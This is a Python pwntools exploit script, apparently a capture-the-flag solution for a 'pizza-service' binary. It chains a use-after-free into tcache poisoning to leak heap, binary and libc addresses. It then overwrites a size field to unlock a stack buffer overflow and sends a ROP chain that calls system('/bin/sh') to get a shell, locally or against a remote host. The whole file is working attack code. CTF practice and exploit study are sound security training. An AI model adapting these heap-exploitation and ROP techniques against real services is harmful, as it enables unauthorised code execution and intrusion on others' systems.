#!/usr/bin/env python3
from pwn import *

elf = ELF("./challenge/pizza-service")
remote_libc = ELF("./lib/libc-2.27.so")

one_gadgets_local = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadgets_remote = [0x4f2c5, 0x4f322, 0x10a38c]

HOST, PORT = "localhost", 1337

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

def main():
    global io, libc, one_gadgets
    pad = 0x10

    io = conn()
    one_gadget = one_gadgets[1]

    # vulnerabilties :
    # - orders can still be edited after being delivered (freed) => tcache poisoning
    # - orders can still be viewed after being delivered (freed) => get leaks
    # - if we get control over current_user->name_size => stack buffer overflow (in login function)

    # name is empty (NULL) so that tcache would still be usable later on
    name = ""
    io.sendlineafter("characters max) : ", name)

    # leak heap address

    new(b"1"*4)
    new(b"2"*4)
    delete(1)
    delete(2)
    heap_leak = u64(show(2)["address"].ljust(8, b"\x00"))
    log.info(f"heap leak: 0x{heap_leak:x}")
    heap = heap_leak >> 4*3 << 4*3
    log.info(f"heap base: 0x{heap:x}")

    # leak binary address

    # heap+0x268: current_user->name
    edit(2, p64(heap + 0x268))
    new(b"3"*4) # dummy
    # heap+0x2c0: orders[0]->pizza_type
    new(p64(heap + 0x2c0))
    binary_leak = u64(current_user().ljust(8, b"\x00"))
    log.info(f"binary leak: 0x{binary_leak:x}")
    elf.address = binary_leak - next(elf.search(b"Cheese\x00"))
    log.info(f"binary base: 0x{elf.address:x}")

    # overwrite current_user->name_size to unlock stack buffer overflow

    delete(3)
    # heap+0x260: current_user
    edit(3, p64(heap + 0x260))
    new(b"5"*4) # dummy
    # write 0xffff to current_user->name_size
    # heap+0x280: the original address value of current_user->name (this is to avoid dereferencing a null ptr)
    new(p64(0xffff) + p64(heap + 0x280)) 
    # now when calling relogin, we can write 0xffff bytes to a stack buffer of size 0x10

    # leak libc address

    elfrop = ROP(elf)
    pop_rdi = elfrop.find_gadget(["pop rdi", "ret"]).address
    ret = elfrop.find_gadget(["ret"]).address

    payload = flat(
        b"A"*(pad+8),
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.login
    )
    relogin(payload)

    libc_leak = u64(io.recvuntil("\nName (", drop=True).ljust(8, b"\x00"))
    log.info(f"libc leak: 0x{libc_leak:x}")
    libc.address = libc_leak - libc.sym.puts
    log.info(f"libc base: 0x{libc.address:x}")

    # call system("/bin/sh\x00")

    payload = flat(
        b"A"*(pad+8),
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        ret,
        libc.sym.system
    )

    # or call a one gadget

    # payload = flat(
    #     b"A"*(pad+8),
    #     libc.address+one_gadget,
    #     # null bytes to satisfy "[rsp+0x40] == NULL" constraint for the one gadget
    #     b"\x00"*0x100
    # )

    io.sendlineafter("characters max) : ", payload)

    io.interactive()

def current_user():
    log.info("current_user()")
    io.recvuntil("Current user : ")
    return io.recvline().strip()

def new(address, pizza_type='1', with_soda='n'):
    log.info(f"new(address={address})")
    io.sendlineafter("Choose an option : ", "1") # Add new order
    io.sendlineafter("No. of pizza type : ", pizza_type)
    io.sendlineafter("With soda ($1.50) ?[y/n] ", with_soda)
    io.sendlineafter("Address where to deliver the order : ", address)

def edit(idx, address, pizza_type='1', with_soda='n'):
    log.info(f"edit(idx={idx}, address={address})")
    io.sendlineafter("Choose an option : ", "2") # Edit order
    io.sendlineafter("Order no. : ", str(idx))
    io.sendlineafter("No. of pizza type : ", pizza_type)
    io.sendlineafter("With soda ($1.50) ?[y/n] ", with_soda)
    io.sendlineafter("Address where to deliver the order : ", address)

def show(idx):
    log.info(f"show(idx={idx})")
    order = {"num": idx}

    io.sendlineafter("Choose an option : ", "3") # View order
    io.sendlineafter("Order no. : ", str(idx))

    io.recvuntil("Pizza type : ")
    order["type"] = io.recvuntil(" Pizza", drop=True)
    io.recvuntil("With soda : ")
    order["with_soda"] = io.recvline().strip() == b"yes"
    io.recvuntil("Total price : $")
    order["total_price"] = float(io.recvline().decode())
    io.recvuntil("Delivery address : ")
    order["address"] = io.recvuntil("\n---------------------------------------------", drop=True)

    return order

def delete(idx):
    log.info(f"delete(idx={idx})")
    io.sendlineafter("Choose an option : ", "4") # Deliver order
    io.sendlineafter("Order no. : ", str(idx))

def relogin(name):
    log.info(f"relogin(name={name}")
    io.sendlineafter("Choose an option : ", "5") # Relogin
    io.sendlineafter("characters max) : ", name)

def conn():
    global libc, one_gadgets
    gdbscript = '''
    '''
    if args.REMOTE:
        libc = remote_libc
        one_gadgets = one_gadgets_remote
        return remote(HOST, PORT)
    else:
        libc = elf.libc
        one_gadgets = one_gadgets_local
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
        return p

if __name__ == "__main__":
    io = None
    libc = None
    try:
        main()
    finally:
        if io:
            io.close()
